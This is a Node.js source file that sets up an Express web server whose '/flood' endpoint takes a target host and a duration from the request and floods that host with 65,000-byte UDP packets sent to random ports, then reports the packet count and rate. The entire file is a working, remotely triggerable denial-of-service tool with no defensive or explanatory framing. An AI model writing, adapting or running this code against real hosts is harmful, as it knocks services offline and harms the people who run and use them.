const express = require('express');
const dgram = require('dgram');
const app = express();
const port = 3000;

app.get('/flood', (req, res) => {
    const host = req.query.host;
    const exec_time = parseInt(req.query.time);
    let packets = 0;
    const max_time = Date.now() + exec_time * 1000;
    const out = 'X'.repeat(65000);

    const sendPacket = () => {
        if (Date.now() > max_time) {
            clearInterval(interval);
            res.send(`<br><b>UDP Flood</b><br>Completed with ${packets} (${((packets * 65) / 1024).toFixed(2)} MB) packets averaging ${(packets / exec_time).toFixed(2)} packets per second \n`);
            return;
        }
        const randPort = Math.floor(Math.random() * 65000) + 1;
        const client = dgram.createSocket('udp4');
        client.send(out, randPort, host, (err) => {
            if (!err) packets++;
            client.close();
        });
    };

    const interval = setInterval(sendPacket, 0);
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
